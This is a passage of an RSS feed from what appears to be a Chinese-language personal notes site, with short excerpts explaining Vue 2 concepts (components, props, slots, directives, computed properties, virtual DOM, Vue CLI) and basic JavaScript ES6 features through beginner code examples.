      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/scoped/</guid>
      <description>scoped 在vue组件中，给style添加scoped属性，以表示它的样式作用于当下的模块，很好的实现了样式私有化的目的，这是一个非常好的机制。
但是为什么要慎用呢？在实际业务中我们往往会对公共组件样式做细微的调整，如果添加了scoped属性，那么样式将会变得不易修改。
使用该属性后，它会给组件添加唯一的自定义属性，使我们原本的CSS 选择器变为 CSS 属性选择器，使得该组件的样式是私有化。</description>
    </item>
    
    <item>
      <title>Vue 使用组件</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6/</guid>
      <description>使用组件 使用组件分为三步：
 定义组件。 注册组件。 应用组件。  HTML
JavaScript
组件名 -命名法：任何环境都可以使用。
大坨峰命名法：只能在脚手架环境下使用（更推荐）。
组件名应尽可能避免与 HTML 已有的元素重名。
定义组件 组件无el配置项。
data 必须是一个函数，该函数返回的对象作为该组件的数据。避免组件被复用时，其数据还存在引用关系。
由于没有el，组件的虚拟 DOM 树必须定义在template 或 render()中。
创建组件的时候，可以使用 name配置项指定当前组件在 Vue 开发者工具中所呈现的名字。
const Student = Vue.extend({  // 指定组件名 	name: &amp;#39;Rainy&amp;#39;, 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{studentName}}&amp;lt;/h1&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	studentName: &amp;#39;忧心&amp;#39;, 	}; 	}, }); 简写 简写的方式去定义组件，虽然我们没有调用Vue.extend()方法，但实际上Vue 在注册组件的时候也会帮我们调用。
const School = { 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{schoolName}}&amp;lt;/h1&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	schoolName: &amp;#39;哈佛&amp;#39;, 	}; 	}, }; 注册组件 局部注册组件 只能在当前实例 el 配置所指定的容器中使用。</description>
    </item>
    
    <item>
      <title>Vue 向组件传递数据</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E5%90%91%E7%BB%84%E4%BB%B6%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E5%90%91%E7%BB%84%E4%BB%B6%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE/</guid>
      <description>向组件传递数据 用props:[]定义属性，并通过attr=‘value’的方式将属性的value传给元素。
var MyComp = { 	props: [&amp;#39;title&amp;#39;], 	template: `&amp;lt;h1&amp;gt;{{title}}&amp;lt;/h1&amp;gt;`, };  var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	components: { 	// 当属性名与属性值一样，则该属性可简写 	MyComp, 	}, 	// 传入属性 title=&amp;#39;Vue&amp;#39; 	template: `&amp;lt;div&amp;gt; &amp;lt;MyComp title=&amp;#39;Vue&amp;#39;&amp;gt;&amp;lt;/MyComp&amp;gt; &amp;lt;/div&amp;gt;`, }); Vue.config.productionTip = false; 在组件中，属性是只读的，不可更改的，这叫做单向数据流。
一个组件的属性，应该避免被除了自身以外的组件所更改或控制</description>
    </item>
    
    <item>
      <title>Vue 插槽</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</guid>
      <description>插槽 单个插槽。将一个组件的内容，传递到&amp;lt;slot&amp;gt;&amp;lt;/solt&amp;gt;中。
&amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt; 具名插槽 有时我们需要多个插槽，就需要给 &amp;lt;slot&amp;gt; 带上一个名字。
一个不带 name 的 &amp;lt;slot&amp;gt; 出口会带有隐含的名字“default”。</description>
    </item>
    
    <item>
      <title>Vue 组件树</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</guid>
      <description>组件树 一个组件创建好后，往往会在各种地方使用它。它可能多次出现在 vue 实例中，也可能出现在其他组件中，于是就形成了一棵组件树</description>
    </item>
    
    <item>
      <title>VueCli</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vuecli/vuecli/</link>
      <pubDate>Fri, 13 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vuecli/vuecli/</guid>
      <description>VueCli 安装 全局安装：
npm install -g @vue/cli 安装完成后，用命令检查安装的版本
vue --version 创建项目 vue create vue-cli 接下来就是一些导航选择，根据自己选择即可。
运行工程 创建完成后，用cd进入 vue-cli目录，再用npm run serve启动工程，出现以下提示即为运行成功：
 App running at:  - Local: http://localhost:8080/  - Network: unavailable Local：它会将工程托管到本地的一个服务器地址http://localhost:8080/。
Network：运行时的网络状态。
项目中的目录文件 node_modules：保存着 Vue 所有直接或间接依赖的第三方库。
public：保存着页面模板。
src：源代码目录。
package.json：工程配置文件
  serve：开发环境，它会将工程托管到一个本地服务器进行预览。
  build：生产环境，它会将工程打包成一个dist文件夹，这个文件夹就是我们工程的源代码
  vue.config.js：vue-cli 的配置文件，大部分都配置都是 webpack配置
 &amp;#34;scripts&amp;#34;: {&amp;#34;serve&amp;#34;: &amp;#34;vue-cli-service serve&amp;#34;,&amp;#34;build&amp;#34;: &amp;#34;vue-cli-service build&amp;#34;}, 还原工程 使用npm install，它会根据package.json文件中的dependencies和devDependencies来还原node_modules目录
配置二年级</description>
    </item>
    
    <item>
      <title>JavaScript ES6</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es6/es6/</link>
      <pubDate>Wed, 11 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es6/es6/</guid>
      <description>ES6 与 JS 的关系 ES 6（ES 2015），ECMAScript 是一种标准，一种规范，同时 JavaScript 又是实现这个标准用的最多的语言。
起先被推广的名字是 ES6 。然而组委会要求 ECMAScript 必须做到每年做一次更新。由此，这个版本被更名为 ES 2015，且每年都需要更新，并命名为当前年的后缀。</description>
    </item>
    
    <item>
      <title>JavaScript Object 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/object/objet-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Wed, 11 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/object/objet-%E6%96%B9%E6%B3%95/</guid>
      <description>Object 方法 defineProperty() 用于在一个对象上定义一个新属性，或者修改一个对象的已有属性，并返回此对象。
使用 defineProperty() 定义的属性无法被枚举。
value 该属性对应的值。默认值为undefined。
enumerable 控制属性是否可以被枚举。
可枚举属性是指那些内部enumerable设置为 true 的属性，对于通过直接的赋值和属性初始化的属性，该标识值默认为即为 true，对于通过Object.defineProperty() 等定义的属性，该标识值默认为 false。
writable 控制属性是否可以被修改，默认值为false
configurable 控制属性是否可以被删除，默认值为false
get() 当访问当前属性时，会调用此函数。该函数的返回值会被用作当前属性的值。
set() 当前属性值被修改时，会调用此函数。该方法接受一个参数（当前属性被赋予的新值），会传入赋值时的 this 对象。
var number = 20; var person = { 	Name: &amp;#39;张三&amp;#39;, 	sex: &amp;#39;男&amp;#39;, 	// age: 25, }; Object.defineProperty(person, &amp;#39;age&amp;#39;, { 	// 每当我们读取 person 的 age 属性时，get() 就会被调用，且返回值是 age 的值 	get() { 	console.log(&amp;#39;读取 age 的值&amp;#39;); 	return number; 	}, 	// 每当我们修改 person 的 age 属性时，set() 就会被调用，且会收到被修改后的的值 	set(value) { 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 箭头函数</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es6/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</link>
      <pubDate>Wed, 11 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es6/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</guid>
      <description>箭头函数 任何可以使用匿名函数的位置均可以使用箭头函数。
// 普通匿名函数 var sum = function (a, b) { 	return a + b; }; console.log(sum(1, 2)); // 箭头函数 var sumES6 = (a, b) =&amp;gt; { 	return a + b; }; console.log(sumES6(4, 3)); 可以看出，定义箭头函在数语法上要比普通函数简洁得多。
参数 如果箭头函数没有参数，直接写一个空括号即可。
如果箭头函数的参数只有一个，也可以省去包裹参数的括号。
如果箭头函数有多个参数，将参数依次用逗号(,)分隔。
// 无参数 var fun1 = () =&amp;gt; {  console.log(&amp;#39;无参数&amp;#39;); };  // 只有一个参数 var fun2 = name =&amp;gt; {  console.log(name); };  // 多个参数 var fun3 = (val1, val2, val3) =&amp;gt; {  return [val1, val2, val3]; }; 函数体 如果箭头函数的函数体中只有一句代码，可以省去函数体的大括号{ }。</description>
    </item>
    
    <item>
      <title>JavaScript 语法糖</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es6/%E8%AF%AD%E6%B3%95%E7%B3%96/</link>
      <pubDate>Wed, 11 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es6/%E8%AF%AD%E6%B3%95%E7%B3%96/</guid>
      <description>语法糖 简写 简写对象的属性以及方法。
var name = &amp;#39;月色&amp;#39;; var age = 20; var sex = &amp;#39;男&amp;#39;; // 传统对象的属性 var person = { 	name: name, 	age: age, 	Fun: function () { 	console.log(sex); 	}, }; // 语法糖对象的属性 var personES6 = { 	name, 	age, 	Fun() { 	console.log(sex); 	}, }; console.log(person); console.log(personES6); 模板字符串 用反引号声明（传统字符串是双引号或单引号）。
通过模板字符串，你可以以${表达式}的形式在模板中插入任何 JavaScript 表达式、变量。
默认支持多行，无需使用\n来换行。
var person = { 	name: &amp;#39;Rainy&amp;#39;, 	age: &amp;#39;20&amp;#39;, }; // 传统字符串拼接 var str = &amp;#39;my name is &amp;#39; + person.</description>
    </item>
    
    <item>
      <title>Mustache</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mustache/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/mustache/</guid>
      <description>Mustache Mustache 是一个 轻逻辑放模板解析引擎。
小程序的 wxml 中的代码、Vue 中的插值都是用的 mustache。
语法 {{keyName}} 简单的变量替换。
{{{keyName}}} 输出会将等特殊字符转译，如果想保持内容原样输出可以使用{{{}}}。
{{#keyName}} {{/keyName}} 以#开始、以/结束表示区块，它会根据当前上下文中的键值来对区块进行一次或多次渲染。它的功能很强大，有类似 if、foreach的功能。
{{^keyName}} {{/keyName}} 该语法与{{#keyName}} {{/keyName}} 类似，不同在于它是当keyName 值为 null, undefined, false 时才渲染输出该区块内容。
{{.}} 表示枚举，可以循环输出整个数组。
{{!comments}} 表示注释
{{&amp;gt;partials}} 以&amp;gt;开始表示子模块，当结构比较复杂时，我们可以使用该语法将复杂的结构拆分成几个小的子模块。</description>
    </item>
    
    <item>
      <title>Vue computd</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</guid>
      <description>computd 通过已有的属性计算出来的属性。
计算属性最终会出现在 Vue 实例上，直接调用即可。
如果计算属性有可能被修改，那必须写set()去响应修改，且要引起计算属性所依赖的属性发生变化。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;p&amp;gt;姓：{{ firstName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;名：{{ lastName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;全名：{{ fullName }}&amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	firstName: &amp;#39;苏&amp;#39;, 	lastName: &amp;#39;明敏&amp;#39;, 	}, 	computed: { 	fullName: { 	get() { 	return this.firstName + &amp;#39;-&amp;#39; + this.lastName; 	}, 	set(value) { 	var arr = value.</description>
    </item>
    
    <item>
      <title>Vue key</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</guid>
      <description>key 表示节点的唯一标识key。
使用 v-for 时，如果不给元素加上 key，那么 Vue 会默认将 index当作元素的key。
该属性可以干预diff 算法，在同一层级，key值相同的节点会进行比对，key值不同的节点则不会比对。
在循环生成的节点中，vue 强烈建议给予每个节点唯一且稳定的 key 值。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-if=&amp;#34;handoff === &amp;#39;login&amp;#39;&amp;#34;&amp;gt; &amp;lt;label&amp;gt;登录&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;1&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div v-else&amp;gt; &amp;lt;label&amp;gt;注册&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt; &amp;lt;!-- handoff 等于：如果 login 为 true，则 handoff === register，否则 handoff === login --&amp;gt; &amp;lt;button @click=&amp;#34;handoff = handoff === &amp;#39;login&amp;#39;?&amp;#39;register&amp;#39;:&amp;#39;login&amp;#39;&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	handoff: &amp;#39;login&amp;#39;, 	}, }); Vue.</description>
    </item>
    
    <item>
      <title>Vue v-for</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</guid>
      <description>v-for 循环渲染元素。
当和 v-if 一起使用时，v-for 的优先级比 v-if 更高。
可以用 of 替代 in 作为分隔符，因为它更接近 JavaScript 迭代器的语法。
不要使用对象或数组之类的非基本类型值作为 v-for 的 key。请用字符串或数值类型的值。
HTML
 &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;ul&amp;gt;  &amp;lt;li v-for=&amp;#34;(p,index) in persons&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;  {{p.name}} and {{p.age}}  &amp;lt;/li&amp;gt;  &amp;lt;/ul&amp;gt;   &amp;lt;ul&amp;gt;  &amp;lt;li v-for=&amp;#34;(f,index) in fruits&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;  {{f}}  &amp;lt;/li&amp;gt;  &amp;lt;/ul&amp;gt;  &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	// 遍历数组 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;小明&amp;#39;, age: 9 }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;小苏&amp;#39;, age: 21 }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;小朱 &amp;#39;, age: 20 }, 	], 	// 遍历对象 	fruits: { 	name: &amp;#39;banana&amp;#39;, 	color: &amp;#39;yellow&amp;#39;, 	kg: &amp;#39;3kg&amp;#39;, 	}, 	}, });  Vue.</description>
    </item>
    
    <item>
      <title>Vue v-if</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</guid>
      <description>v-if 控制元素是否存在。
如果多个 if 指令：v-if、v-else、v-else-if连用，则使用它们的元素必须紧挨。
在 &amp;lt;template&amp;gt; 元素上使用 v-if 时，最终的渲染结果将不包含 &amp;lt;template&amp;gt; 元素。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 如果 isShow 为 true，则插入 img，如果 isShow 为 false，则移除 img --&amp;gt;  &amp;lt;img v-if=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;!-- 否则（img 已移除），则显示 button 元素，如果 img 已插入，则移除 button--&amp;gt; &amp;lt;button v-else=&amp;#34;!isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-on</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</guid>
      <description>v-on 注册一个事件，可简写为@。
支持一些指令修饰符，比如 prevent。
事件函数必须存在于methods中，事件参数为event。
&amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-on:click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 缩写 --&amp;gt; &amp;lt;a @click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; 调用事件函数时
 不加括号，调用事件函数就可以直接获取到该函数的事件对象。 加了 ()， 除了可以使用$event来获取事件对象，还能传入其他的参数。  &amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo2($event,6666)&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue v-show</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</guid>
      <description>v-show 控制元素是否可见，如果元素不可见，则该元素display:none。
HTML &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-show=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;button @click=&amp;#34;isShow = !isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: {	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 挂载</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</guid>
      <description>挂载 将生成的真实 DOM 树，插入到页面上的过程，称之为挂载。
挂载方式 通过el:&#39;CSS 选择器&#39;来挂载。
new Vue({ 	// vue 代码 }).$mount(&amp;#39;#app&amp;#39;); 通过Vue 实例.$mount(&#39;CSS 选择器&#39;)进行稍后挂载。
// 或者 var v = Vue({ 	// vue 代码 }); v.$mount(&amp;#39;#app&amp;#39;); </description>
    </item>
    
    <item>
      <title>Vue 指令</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</guid>
      <description>指令 用于解析元素（属性、内存、事件等），比如使用v-binds:url来进行解析，使得该属性成为动态属性。其中 url必须是JavaScrip表达式，也可以直接读取 data 中的数据。
Vue 中的指令始终以v-开头。
v-bind 单项数据绑，数据只能从 data 流向页面。
HTML &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-bind:src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; JavaScrip var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; 简写 &amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-bind:href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 简写 --&amp;gt; &amp;lt;a :href=&amp;#34;url&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 指令修饰符</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>指令修饰符 prevent 阻止元素默认行为，比如 a 元素的跳转。
指令修饰符可以连写，先阻止元素默认行为，再阻止元素冒泡。
&amp;lt;a @click.prevent.stop=&amp;#34;btn&amp;#34; href=&amp;#34;https://ke.qq.com/&amp;#34;&amp;gt;123&amp;lt;/a&amp;gt; stop 阻止元素的事件冒泡。
once 事件只触发一次
capture 使用事件的捕获模式
self 只有 event.target 是当前操作的元素时，才触发该事件
&amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;!--因为触发事件冒泡 target 不是 div，而是 button--&amp;gt;  &amp;lt;!--所以点击 button 不会触发事件冒泡--&amp;gt;  &amp;lt;div @click.self=&amp;#39;showInfo2&amp;#39;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; passive 事件的默认行为立即执行，无需等待事件的回调执行完毕</description>
    </item>
    
    <item>
      <title>Vue 注入</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</guid>
      <description>注入 配置的实例对象中的部分内容会被提取到 Vue 实例中：
 data:{} methods: {}  该过程称之为注入，注入的目的有两个：
完成数据响应式 Vue 是如何知道数据被更改的？
vue 2.0，是通过object.defineProperty()完成的数据响应式。该方法有很多缺陷，比如我们新增或删除data中的属性，此时的页面会无法正常响应。
vue 3.0，是通过 Class proxy。
绑定 this 通过 bind()来改变 this 的指向。</description>
    </item>
    
    <item>
      <title>Vue 虚拟 DOM 树</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</link>
      <pubDate>Tue, 10 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</guid>
      <description>虚拟 DOM 树 它是一个普通的对象，对应着真实的 DOM 树；虚拟 DOM 树的节点都是虚拟的节点。
为了提高效率，vue 会把模板编译成为虚拟 DOM 树，然后生成真实 DOM 树。
因为浏览器如果直接修改真实的 DOM 树，这是非常影响效率的，但如果修改一个对象，那么效率是非常高的。
数据响应式 当数据更改时，会将更改后的内容编译成一棵新的虚拟 DOM 树，然后将其与旧的虚拟 DOM 树比对（diff算法），仅将两棵虚拟 DOM 属有差异的节点渲染为真实 DOM 树，没有差异的节点则直接使用旧虚拟 DOM 树所对应的真实 DOM 树上的节点（复用）。这样可最小程度的改动真实 DOM，提升页面渲染效率。
因此，对于 Vue 而言，提升效率重点在于两个方面：
  减少新的虚拟 DOM 的生成。
  保证虚拟 DOM 树对比之后，只有必要的节点发生变化。
  如何生成虚拟 DOM 树 生成虚拟 DOM 树的方式：
 在挂载的元素内部直接书写，此时使用元素的outerHTML作为模板。优先级最低。 在template配置中书写,，它是一个模板字符串。优先级比第一种方式高。 在render()中直接创建虚拟节点树，此时，完全脱离模板，这会省略将模板编译为虚拟 DOM 树的步骤。优先级最高。  使用render()循环创建 1—6 级标题：
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	render(t) { 	var titles = []; 	for (var i = 1; i &amp;lt;= 6; i++) { 	titles.</description>
    </item>
    
    <item>
      <title>JavaScrip 时间线</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%97%B6%E9%97%B4%E7%BA%BF/</link>
      <pubDate>Mon, 09 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%97%B6%E9%97%B4%E7%BA%BF/</guid>
      <description>时间线 浏览器加载一个页面时，当开始执行 JavaScrip 的那一刻，浏览器会有一个特定的加载顺序，按照这个加载顺序一步步的执行的过程，就会形成一个时间线。
顺序 大致就三步：创建 Document ——&amp;gt; DOMTree 解析完毕，文档加载完毕并执行完毕。
